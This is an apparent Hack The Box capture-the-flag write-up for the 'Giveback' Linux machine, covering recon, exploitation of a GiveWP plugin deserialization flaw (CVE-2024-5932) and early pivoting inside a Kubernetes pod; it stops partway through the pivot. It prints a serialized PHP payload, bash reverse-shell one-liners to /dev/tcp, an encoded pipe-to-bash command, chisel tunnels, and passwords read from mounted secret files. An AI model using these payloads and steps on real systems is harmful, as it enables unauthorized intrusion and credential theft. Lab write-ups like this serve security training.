---
tags:
  - HTB
  - Boot2Root
  - Hacking
  - Linux
  - Kubernetes
  - PHP-Parameter-Injection
  - CVE-2024-5932
  - GiveWP
  - PHP-CGI
  - OCI-Bundle
---
# Overview

| Name        | Giveback    |
| ----------- | ----------- |
| OS          | Linux       |
| Base Points | Medium [30] |
| Status      | Done        |
# Recon
## Nmap

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~]
└─$ sudo nmap -sC -sV -T4 10.10.11.94
[sudo] password for at0m:
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-02 13:08 +0545
Nmap scan report for 10.10.11.94
Host is up (0.33s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 66:f8:9c:58:f4:b8:59:bd:cd:ec:92:24:c3:97:8e:9e (ECDSA)
|_  256 96:31:8a:82:1a:65:9f:0a:a2:6c:ff:4d:44:7c:d3:94 (ED25519)
80/tcp open  http    nginx 1.28.0
| http-robots.txt: 1 disallowed entry
|_/wp-admin/
|_http-generator: WordPress 6.8.1
|_http-title: GIVING BACK IS WHAT MATTERS MOST &#8211; OBVI
|_http-server-header: nginx/1.28.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.53 seconds
```

![[giveback.png]]
# Enumeration

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~]
└─$ feroxbuster -u http://giveback.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,php,txt,json,xml -t 50

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://giveback.htb/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [html, php, txt, json, xml]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
302      GET        0l        0w        0c http://giveback.htb/wp-admin/ => http://giveback.htb/wp-login.php?redirect_to=http%3A%2F%2Fgiveback.htb%2Fwp-admin%2F&reauth=1
400      GET        1l        1w        1c http://giveback.htb/wp-admin/admin-ajax.php
404      GET      257l     2096w    51763c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
503      GET        7l       13w      197c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        7l       20w      237c http://giveback.htb/wp-admin => http://giveback.htb/wp-admin/
404      GET        0l        0w        0c http://giveback.htb/wp-admin/index
404      GET        0l        0w        0c http://giveback.htb/wp-admin/archive
404      GET        0l        0w        0c http://giveback.htb/wp-admin/2006
404      GET        0l        0w        0c http://giveback.htb/wp-admin/download
404      GET        0l        0w        0c http://giveback.htb/wp-admin/contact
404      GET        0l        0w        0c http://giveback.htb/wp-admin/warez
404      GET        0l        0w        0c http://giveback.htb/wp-admin/wp-admin/
301      GET        7l       20w      244c http://giveback.htb/wp-admin/images => http://giveback.htb/wp-admin/images/
404      GET        0l        0w        0c http://giveback.htb/wp-admin/12.html
404      GET        0l        0w        0c http://giveback.htb/wp-admin/print.txt
404      GET        0l        0w        0c http://giveback.htb/wp-admin/adclick.html
404      GET        0l        0w        0c http://giveback.htb/wp-admin/2001.php
404      GET        0l        0w        0c http://giveback.htb/strona_4.xml
404      GET        0l        0w        0c http://giveback.htb/wp-admin/images/strona_4.txt
404      GET        0l        0w        0c http://giveback.htb/wp-admin/issues.php
404      GET        0l        0w        0c http://giveback.htb/authors
404      GET        0l        0w        0c http://giveback.htb/wp-admin/images01.php
200      GET        2l       29w     1123c http://giveback.htb/wp-admin/js/password-strength-meter.min.js
200      GET        2l       10w      351c http://giveback.htb/wp-includes/js/zxcvbn-async.min.js
200      GET        2l       63w     2358c http://giveback.htb/wp-includes/js/dist/a11y.min.js
200      GET        2l      256w     9009c http://giveback.htb/wp-includes/js/clipboard.min.js
200      GET        2l      181w     9141c http://giveback.htb/wp-includes/js/dist/i18n.min.js
200      GET        2l      175w     6061c http://giveback.htb/wp-includes/css/buttons.min.css
200      GET        2l      140w     4776c http://giveback.htb/wp-includes/js/dist/hooks.min.js
200      GET        2l       23w     1426c http://giveback.htb/wp-includes/js/wp-util.min.js
200      GET        2l       14w      457c http://giveback.htb/wp-includes/js/dist/dom-ready.min.js
200      GET        2l      104w     6862c http://giveback.htb/wp-admin/js/user-profile.min.js
200      GET        2l      150w     3200c http://giveback.htb/wp-admin/css/l10n.min.css
200      GET        3l     1263w    87553c http://giveback.htb/wp-includes/js/jquery/jquery.min.js
200      GET        2l      506w    18905c http://giveback.htb/wp-includes/js/underscore.min.js
200      GET        2l      400w    13577c http://giveback.htb/wp-includes/js/jquery/jquery-migrate.min.js
200      GET        2l      207w     6381c http://giveback.htb/wp-admin/css/login.min.css
200      GET        2l       12w    59016c http://giveback.htb/wp-includes/css/dashicons.min.css
404      GET        0l        0w        0c http://giveback.htb/wp-admin/images/add.html
404      GET        0l        0w        0c http://giveback.htb/wp-admin/back.txt
200      GET        2l      664w    28448c http://giveback.htb/wp-admin/css/forms.min.css
404      GET        0l        0w        0c http://giveback.htb/wp-admin/skins.xml
404      GET        0l        0w        0c http://giveback.htb/programming.html
200      GET      101l      378w     5947c http://giveback.htb/wp-login.php
404      GET        0l        0w        0c http://giveback.htb/wp-admin/images/project.html
```

Site seems to be full Wordpress.
## WPScan

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~]
└─$ curl -s http://giveback.htb/ | grep plugins
<link rel='stylesheet' id='give-styles-css' href='http://giveback.htb/wp-content/plugins/give/assets/dist/css/give.css?ver=3.14.0' type='text/css' media='all' />
<link rel='stylesheet' id='give-donation-summary-style-frontend-css' href='http://giveback.htb/wp-content/plugins/give/assets/dist/css/give-donation-summary.css?ver=3.14.0' type='text/css' media='all' />
<script type="text/javascript" src="http://giveback.htb/wp-content/plugins/give/assets/dist/js/give.js?ver=fd6dd27625eb0240" id="give-js"></script>
{"prefetch":[{"source":"document","where":{"and":[{"href_matches":"\/*"},{"not":{"href_matches":["\/wp-*.php","\/wp-admin\/*","\/wp-content\/uploads\/*","\/wp-content\/*","\/wp-content\/plugins\/*","\/wp-content\/themes\/green-wealth\/*","\/wp-content\/themes\/bizberg\/*","\/*\\?(.+)"]}},{"not":{"selector_matches":"a[rel~=\"nofollow\"]"}},{"not":{"selector_matches":".no-prefetch, .no-prefetch a"}}]},"eagerness":"conservative"}]}
<script type="text/javascript" src="http://giveback.htb/wp-content/plugins/give/assets/dist/js/give-donation-summary.js?ver=3.14.0" id="give-donation-summary-script-frontend-js"></script>
```

From Wpscan we can know Wpgive plugin is vulnerable.
# Initial Foothold
## [CVE-2024-5932](https://github.com/EQSTLab/CVE-2024-5932)

We have GiveWp plugin 3.14.0 which has a vulnerability PHP object injection RCE.

```bash
┌──(venv)─(at0m㉿DESKTOP-RA9DG2K)-[~/CVE-2024-5932]
└─$ python CVE-2024-5932-rce.py -u http://giveback.htb/donations/the-things-we-need/ -c "bash -c 'bash -i >& /dev/tcp/10.10.15.211/4444 0>&1'"
                                                                                                                                                                                                                                                                                                        
             ..-+*******-
            .=#+-------=@.                        .:==:.
           .**-------=*+:                      .-=++.-+=:.
           +*-------=#=+++++++++=:..          -+:==**=+-+:.
          .%----=+**+=-:::::::::-=+**+:.      ==:=*=-==+=..
          :%--**+-::::::::::::::::::::+*=:     .::*=**=:.
   ..-++++*@#+-:::::::::::::::::::::::::-*+.    ..-+:.
 ..+*+---=#+::::::::::::::::::::::::::::::=*:..-==-.
 .-#=---**:::::::::::::::::::::::::=+++-:::-#:..            :=+++++++==.   ..-======-.     ..:---:..
  ..=**#=::::::::::::::::::::::::::::::::::::%:.           *@@@@@@@@@@@@:.-#@@@@@@@@@%*:.-*%@@@@@@@%#=.
   .=#%=::::::::::::::::::::::::::::::::-::::-#.           %@@@@@@@@@@@@+:%@@@@@@@@@@@%==%@@@@@@@@@@@%-
  .*+*+:::::::::::-=-::::::::::::::::-*#*=::::#: ..*#*+:.  =++++***%@@@@+-@@@#====%@@@%==@@@#++++%@@@%-
  .+#*-::::::::::+*-::::::::::::::::::+=::::::-#..#+=+*%-.  :=====+#@@@@-=@@@+.  .%@@@%=+@@@+.  .#@@@%-
   .+*::::::::::::::::::::::::+*******=::::::--@.+@#+==#-. #@@@@@@@@@@@@.=@@@%*++*%@@@%=+@@@#====@@@@%-
   .=+:::::::::::::=*+::::::-**=-----=#-::::::-@%+=+*%#:. .@@@@@@@@@@@%=.:%@@@@@@@@@@@#-=%@@@@@@@@@@@#-
   .=*::::::::::::-+**=::::-#+--------+#:::-::#@%*==+*-   .@@@@#=----:.  .-+*#%%%%@@@@#-:+#%@@@@@@@@@#-
   .-*::::::::::::::::::::=#=---------=#:::::-%+=*#%#-.   .@@@@%######*+.       .-%@@@#:  .....:+@@@@*:
    :+=:::::::::::-:-::::-%=----------=#:::--%++++=**      %@@@@@@@@@@@@.        =%@@@#.        =@@@@*.
    .-*-:::::::::::::::::**---------=+#=:::-#**#*+#*.      -#%@@@@@@@@@#.        -%@@%*.        =@@@@+.
.::-==##**-:::-::::::::::%=-----=+***=::::=##+#=.::         ..::----:::.         .-=--.         .=+=-.
%+==--:::=*::::::::::::-:+#**+=**=::::::-#%=:-%.
*+.......+*::::::::::::::::-****-:::::=*=:.++:*=
.%:..::::*@@*-::::::::::::::-+=:::-+#%-.   .#*#.
 ++:.....#--#%**=-:::::::::::-+**+=:@#....-+*=.
 :#:....:#-::%..-*%#++++++%@@@%*+-.#-=#+++-..
 .++....-#:::%.   .-*+-..*=.+@= .=+..-#
 .:+++#@#-:-#= ...   .-++:-%@@=     .:#
     :+++**##@#+=.      -%@@@%-   .-=*#.
    .=+::+::-@:         #@@@@+. :+*=::=*-
    .=+:-**+%%+=-:..    =*#*-..=*-:::::=*
     :++---::--=*#+*+++++**+*+**-::::::+=
      .+*=:::---+*:::::++++++*+=:::::-*=.
       .:=**+====#*::::::=%:...-=++++=.      Author: EQST(Experts, Qualified Security Team)
           ..:----=**++++*+.                 Github: https://github.com/EQSTLab/CVE-2024-5932

                                                                                                                                                                                                                                                                                                        
Analysis base : https://www.wordfence.com/blog/2024/08/4998-bounty-awarded-and-100000-wordpress-sites-protected-against-unauthenticated-remote-code-execution-vulnerability-patched-in-givewp-wordpress-plugin/

=============================================================================================================

CVE-2024-5932 : GiveWP unauthenticated PHP Object Injection
description: The GiveWP  Donation Plugin and Fundraising Platform plugin for WordPress is vulnerable to PHP Object Injection in all versions up to, and including, 3.14.1 via deserialization of untrusted input from the 'give_title' parameter. This makes it possible for unauthenticated attackers to inject a PHP Object. The additional presence of a POP chain allows attackers to execute code remotely, and to delete arbitrary files.
Arbitrary File Deletion

=============================================================================================================

[\] Exploit loading, please wait...
[+] Requested Data:
{'give-form-id': '17', 'give-form-hash': 'e409972290', 'give-price-id': '0', 'give-amount': '$10.00', 'give_first': 'Thomas', 'give_last': 'Howe', 'give_email': 'james23@example.org', 'give_title': 'O:19:"Stripe\\\\\\\\StripeObject":1:{s:10:"\\0*\\0_values";a:1:{s:3:"foo";O:62:"Give\\\\\\\\PaymentGateways\\\\\\\\DataTransferObjects\\\\\\\\GiveInsertPaymentData":1:{s:8:"userInfo";a:1:{s:7:"address";O:4:"Give":1:{s:12:"\\0*\\0container";O:33:"Give\\\\\\\\Vendors\\\\\\\\Faker\\\\\\\\ValidGenerator":3:{s:12:"\\0*\\0validator";s:10:"shell_exec";s:12:"\\0*\\0generator";O:34:"Give\\\\\\\\Onboarding\\\\\\\\SettingsRepository":1:{s:11:"\\0*\\0settings";a:1:{s:8:"address1";s:52:"bash -c \'bash -i >& /dev/tcp/10.10.15.211/4444 0>&1\'";}}s:13:"\\0*\\0maxRetries";i:10;}}}}}}', 'give-gateway': 'offline', 'action': 'give_process_donation'}
```

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~]
└─$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.15.211] from (UNKNOWN) [10.10.11.94] 53637
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
<-779bf669bd-nfqnf:/opt/bitnami/wordpress/wp-admin$ whoami
whoami
whoami: cannot find name for user ID 1001
<-779bf669bd-nfqnf:/opt/bitnami/wordpress/wp-admin$
```

```bash
<-779bf669bd-nfqnf:/opt/bitnami/wordpress/wp-admin$ python3 -c 'import pty; pty.spawn("/bin/bash")'
<in$ python3 -c 'import pty; pty.spawn("/bin/bash")'
bash: python3: command not found
<-779bf669bd-nfqnf:/opt/bitnami/wordpress/wp-admin$ ls
ls
about.php
admin-ajax.php
admin-footer.php
admin-functions.php
admin-header.php
admin-post.php
admin.php
async-upload.php
authorize-application.php
comment.php
contribute.php
credits.php
css
custom-background.php
custom-header.php
customize.php
edit-comments.php
edit-form-advanced.php
edit-form-blocks.php
edit-form-comment.php
edit-link-form.php
edit-tag-form.php
edit-tags.php
edit.php
erase-personal-data.php
export-personal-data.php
export.php
freedoms.php
images
import.php
includes
index.php
install-helper.php
install.php
js
link-add.php
link-manager.php
link-parse-opml.php
link.php
load-scripts.php
load-styles.php
maint
media-new.php
media-upload.php
media.php
menu-header.php
menu.php
moderation.php
ms-admin.php
ms-delete-site.php
ms-edit.php
ms-options.php
ms-sites.php
ms-themes.php
ms-upgrade-network.php
ms-users.php
my-sites.php
nav-menus.php
network
network.php
options-discussion.php
options-general.php
options-head.php
options-media.php
options-permalink.php
options-privacy.php
options-reading.php
options-writing.php
options.php
plugin-editor.php
plugin-install.php
plugins.php
post-new.php
post.php
press-this.php
privacy-policy-guide.php
privacy.php
profile.php
revision.php
setup-config.php
site-editor.php
site-health-info.php
site-health.php
term.php
theme-editor.php
theme-install.php
themes.php
tools.php
update-core.php
update.php
upgrade-functions.php
upgrade.php
upload.php
user
user-edit.php
user-new.php
users.php
widgets-form-blocks.php
widgets-form.php
widgets.php
<-779bf669bd-nfqnf:/opt/bitnami/wordpress/wp-admin$
```

Seem to be in container.
# Pivoting

```bash
<-779bf669bd-nfqnf:/opt/bitnami/wordpress/wp-admin$ ps aux
ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
1001           1  0.0  1.0 311016 43960 ?        Ss   13:16   0:01 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
1001         239  0.2  1.9 395168 80104 ?        S    13:16   0:09 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
1001         240  0.2  1.9 397248 76700 ?        S    13:16   0:08 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
1001         241  0.0  1.8 397020 75568 ?        S    13:16   0:02 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
1001         311  0.1  1.8 397196 76104 ?        S    13:25   0:03 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
1001         339  0.0  0.0   2584   884 ?        S    13:26   0:00 sh -c bash -c 'bash -i >& /dev/tcp/10.10.15.90/8484 0>&1'
1001         340  0.0  0.0   3932  2920 ?        S    13:26   0:00 bash -c bash -i >& /dev/tcp/10.10.15.90/8484 0>&1
1001         341  0.0  0.0   4196  3344 ?        S    13:26   0:00 bash -i
1001         663  0.0  1.8 397000 75416 ?        S    13:32   0:00 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
1001        1956  0.0  0.0   2584   840 ?        S    13:33   0:00 sh -c bash -c "bash -i >& /dev/tcp/10.10.15.76/7777 0>&1"
1001        1958  0.0  0.0   3932  2888 ?        S    13:33   0:00 bash -c bash -i >& /dev/tcp/10.10.15.76/7777 0>&1
1001        1959  0.0  0.0   4196  3428 ?        S    13:33   0:00 bash -i
1001        7064  0.0  0.0   2584   832 ?        S    13:44   0:00 sh -c bash -c 'bash -i >& /dev/tcp/10.10.14.232/443 0>&1'
1001        7065  0.0  0.0   3932  2928 ?        S    13:44   0:00 bash -c bash -i >& /dev/tcp/10.10.14.232/443 0>&1
1001        7066  0.0  0.0   4328  3416 ?        S    13:44   0:00 bash -i
1001        7088  0.4  1.9 395164 76640 ?        S    13:47   0:07 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
1001        7089  2.4  2.3 412028 92828 ?        S    13:47   0:43 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
1001        7094  2.3  2.3 412020 92728 ?        S    13:47   0:41 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
1001        7172  0.0  0.3 1234552 12480 ?       Sl   13:51   0:00 ./chisel client 10.10.15.76:8080 R:5000:10.43.2.241:5000
1001       23953 42.3  0.1   6652  5064 ?        R    14:06   4:44 grep -r -i -E user|username /
1001       26850  0.0  0.0   2584   896 ?        S    14:07   0:00 sh -c echo WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TlM0eE16Y3ZPVGs1T1NBd1BpWXhDZz09 | base64 -d | base64 -d | bash
1001       26854  0.0  0.0   3932  2964 ?        S    14:07   0:00 bash
1001       26855  0.0  0.0   4196  3580 ?        S    14:07   0:00 bash -i
1001       26863  0.0  0.0   2584   904 ?        S    14:08   0:00 sh -c bash -c 'bash -i >& /dev/tcp/10.10.15.90/8484 0>&1'
1001       26864  0.0  0.0   3932  2888 ?        S    14:08   0:00 bash -c bash -i >& /dev/tcp/10.10.15.90/8484 0>&1
1001       26865  0.0  0.0   4196  3412 ?        S    14:08   0:00 bash -i
1001       26869  0.2  1.8 396636 74956 ?        S    14:09   0:01 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
1001       26870  0.0  0.0   2584   872 ?        S    14:09   0:00 sh -c bash -c "bash -i >& /dev/tcp/10.10.16.167/60001 0>&1"
1001       26871  0.0  0.0   3932  2904 ?        S    14:09   0:00 bash -c bash -i >& /dev/tcp/10.10.16.167/60001 0>&1
1001       26872  0.0  0.0   4196  3460 ?        S    14:09   0:00 bash -i
1001       26916  0.0  0.0   2584   848 ?        S    14:10   0:00 sh -c bash -c 'bash -i >& /dev/tcp/10.10.14.232/443 0>&1'
1001       26917  0.0  0.0   3932  2904 ?        S    14:10   0:00 bash -c bash -i >& /dev/tcp/10.10.14.232/443 0>&1
1001       26918  0.0  0.0   4196  3472 ?        S    14:10   0:00 bash -i
1001       26919  0.4  1.7 322520 71404 ?        R    14:10   0:01 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
1001       26929  0.4  1.7 322568 71280 ?        R    14:11   0:01 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
1001       26930  0.0  0.0   2584   848 ?        S    14:11   0:00 sh -c bash -c 'bash -i >& /dev/tcp/10.10.15.211/4444 0>&1'
1001       26931  0.0  0.0   3932  2896 ?        S    14:11   0:00 bash -c bash -i >& /dev/tcp/10.10.15.211/4444 0>&1
1001       26932  0.0  0.0   4196  3496 ?        S    14:11   0:00 bash -i
1001       26950  0.0  0.0   2584   880 ?        S    14:15   0:00 sh -c bash -c "bash -i >& /dev/tcp/10.10.15.76/7777 0>&1"
1001       26951  0.0  0.0   3932  2956 ?        S    14:15   0:00 bash -c bash -i >& /dev/tcp/10.10.15.76/7777 0>&1
1001       26952  0.0  0.0   4196  3556 ?        S    14:15   0:00 bash -i
1001       26953  0.8  1.6 320336 67628 ?        R    14:15   0:00 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
1001       26957  0.1  0.2 1233656 9836 ?        Sl   14:16   0:00 ./chisel client 10.10.15.76:8080 R:8080:beta-vino-wp-wordpress:80
1001       26968  2.4  1.6 320336 66960 ?        S    14:16   0:00 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
1001       26969  2.9  1.6 320336 66984 ?        R    14:16   0:00 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
1001       26970  2.0  1.6 320336 66872 ?        R    14:16   0:00 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
1001       26971  2.0  1.6 320336 66860 ?        R    14:16   0:00 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
1001       26972  2.6  1.6 320336 66944 ?        R    14:16   0:00 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
1001       26973  1.2  1.6 318288 64956 ?        S    14:16   0:00 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
1001       26974  1.5  1.6 318288 64908 ?        R    14:16   0:00 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
1001       26976  2.3  1.7 322384 68512 ?        R    14:16   0:00 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
1001       26977  1.5  1.6 318288 64828 ?        R    14:16   0:00 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
1001       26978  2.2  1.6 320336 66912 ?        R    14:16   0:00 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
1001       26979  1.5  1.6 318288 64788 ?        R    14:16   0:00 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
1001       26980  2.2  1.6 320336 66872 ?        R    14:16   0:00 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
1001       26981  1.8  1.7 322384 68844 ?        R    14:16   0:00 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
1001       26982  1.6  1.6 318288 64832 ?        R    14:16   0:00 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
1001       26984  2.3  1.6 320336 66912 ?        R    14:16   0:00 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
1001       26985  1.9  1.6 318288 64828 ?        R    14:16   0:00 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
1001       26986  1.7  1.6 318288 64832 ?        R    14:16   0:00 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
1001       26988  1.9  1.7 322384 68868 ?        R    14:16   0:00 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
1001       26996  2.0  1.6 318288 65528 ?        S    14:16   0:00 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
1001       26997  1.4  1.6 318288 64916 ?        R    14:16   0:00 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
1001       27000  0.0  0.2 311148 10640 ?        S    14:17   0:00 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
1001       27001  4.5  0.1   8508  4800 ?        R    14:17   0:00 ps aux
<-779bf669bd-nfqnf:/opt/bitnami/wordpress/wp-admin$
```

- **Chisel tunnels** running:
    
    - `./chisel client 10.10.15.76:8080 R:5000:10.43.2.241:5000`
    - This showed there's a tunnel to `10.43.2.241:5000`

```bash
I have no name!@beta-vino-wp-wordpress-779bf669bd-nfqnf:/run$ cat /etc/hosts
cat /etc/hosts
# Kubernetes-managed hosts file.
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
fe00::0 ip6-mcastprefix
fe00::1 ip6-allnodes
fe00::2 ip6-allrouters
10.42.1.182     beta-vino-wp-wordpress-779bf669bd-nfqnf

# Entries added by HostAliases.
127.0.0.1       status.localhost
```

The hosts file shows we're in pod `10.42.1.182`. 

We need to pivot to `10.43.2.241:5000`.

```bash
<-779bf669bd-nfqnf:/opt/bitnami/wordpress/wp-admin$ cat /etc/hostname
cat /etc/hostname
beta-vino-wp-wordpress-779bf669bd-nfqnf
<-779bf669bd-nfqnf:/opt/bitnami/wordpress/wp-admin$ netstat -tulpn
netstat -tulpn
bash: netstat: command not found
<-779bf669bd-nfqnf:/opt/bitnami/wordpress/wp-admin$ ss -tulpn
ss -tulpn
bash: ss: command not found
<-779bf669bd-nfqnf:/opt/bitnami/wordpress/wp-admin$
```

The hostname confirms this is a Kubernetes pod (`beta-vino-wp-wordpress-779bf669bd-nfqnf`).

```bash
cd /ls

I have no name!@beta-vino-wp-wordpress-779bf669bd-nfqnf:/$ ls
bin
bitnami
boot
dev
etc
home
lib
lib64
media
mnt
opt
post-init.d
post-init.sh
proc
root
run
sbin
secrets
srv
sys
tmp
usr
var
I have no name!@beta-vino-wp-wordpress-779bf669bd-nfqnf:/$
```

```bash
I have no name!@beta-vino-wp-wordpress-779bf669bd-nfqnf:/$ cd /secrets
cd /secrets
I have no name!@beta-vino-wp-wordpress-779bf669bd-nfqnf:/secrets$ ls
ls
mariadb-password
mariadb-root-password
wordpress-password
I have no name!@beta-vino-wp-wordpress-779bf669bd-nfqnf:/secrets$ cat wordpress-password
<s-779bf669bd-nfqnf:/secrets$ cat wordpress-password
O8F7KR5zGiI have no name!@beta-vino-wp-wordpress-779bf669bd-nfqnf:/secrets$ cat mariadb-password
<ess-779bf669bd-nfqnf:/secrets$ cat mariadb-password
sW5sp4spa3u7RLyetrekE4oSI have no name!@beta-vino-wp-wordpress-779bf669bd-nfqnf:/secrets$ cat mariadb-root-password
<79bf669bd-nfqnf:/secrets$ cat mariadb-root-password
```

```bash
I have no name!@beta-vino-wp-wordpress-779bf669bd-nfqnf:/run$ which php
which php
/opt/bitnami/php/bin/php
I have no name!@beta-vino-wp-wordpress-779bf669bd-nfqnf:/run$ php -v
php -v
PHP 8.2.28 (cli) (built: Jun 12 2025 13:10:34) (NTS)
Copyright (c) The PHP Group
Zend Engine v4.2.28, Copyright (c) Zend Technologies
    with Zend OPcache v8.2.28, Copyright (c), by Zend Technologies
```
## Test the PHP-CGI Service Using PHP

Use this `php -r "echo file_get_contents('http://10.43.2.241:5000/');"` to see CGI bin. 

```bash
I have no name!@beta-vino-wp-wordpress-779bf669bd-nfqnf:/run$
# Test if the PHP-CGI service is accessible using PHP
php -r "echo file_get_contents('http://10.43.2.241:5000/');"


<!DOCTYPE html>
<html>
<head>
  <title>GiveBack LLC Internal CMS</title>
  <!-- Developer note: phpinfo accessible via debug mode during migration window -->
  <style>
    body { font-family: Arial, sans-serif; margin: 40px; background: #f9f9f9; }
    .header { color: #333; border-bottom: 1px solid #ccc; padding-bottom: 10px; }
    .info { background: #eef; padding: 15px; margin: 20px 0; border-radius: 5px; }
    .warning { background: #fff3cd; border: 1px solid #ffeeba; padding: 10px; margin: 10px 0; }
    .resources { margin: 20px 0; }
    .resources li { margin: 5px 0; }
    a { color: #007bff; text-decoration: none; }
    a:hover { text-decoration: underline; }
  </style>
</head>
<body>
  <div class="header">
    <h1>🏢 GiveBack LLC Internal CMS System</h1>
    <p><em>Development Environment – Internal Use Only</em></p>
  </div>

  <div class="warning">
    <h4>⚠️ Legacy Notice</h4>
    <p>**SRE** - This system still includes legacy CGI support. Cluster misconfiguration may likely expose internal scripts.</p>
  </div>

  <div class="resources">
    <h3>Internal Resources</h3>
    <ul>
      <li><a href="/admin/">/admin/</a> — VPN Required</li>
      <li><a href="/backups/">/backups/</a> — VPN Required</li>
      <li><a href="/runbooks/">/runbooks/</a> — VPN Required</li>
      <li><a href="/legacy-docs/">/legacy-docs/</a> — VPN Required</li>
      <li><a href="/debug/">/debug/</a> — Disabled</li>
      <li><a href="/cgi-bin/info">/cgi-bin/info</a> — CGI Diagnostics</li>
      <li><a href="/cgi-bin/php-cgi">/cgi-bin/php-cgi</a> — PHP-CGI Handler</li>
      <li><a href="/phpinfo.php">/phpinfo.php</a></li>
      <li><a href="/robots.txt">/robots.txt</a> — Crawlers: Disallowed</li>
    </ul>
  </div>

  <div class="info">
    <h3>Developer Note</h3>
    <p>This CMS was originally deployed on Windows IIS using <code>php-cgi.exe</code>.
    During migration to Linux, the Windows-style CGI handling was retained to ensure
    legacy scripts continued to function without modification.</p>
  </div>
</body>
</html>

```

The HTML page shows:

```html
<li><a href="/cgi-bin/info">/cgi-bin/info</a> — CGI Diagnostics</li>
<li><a href="/cgi-bin/php-cgi">/cgi-bin/php-cgi</a> — PHP-CGI Handler</li>
```
###  Developer Notes Reveal the Architecture

- Originally deployed on **Windows IIS with php-cgi.exe**
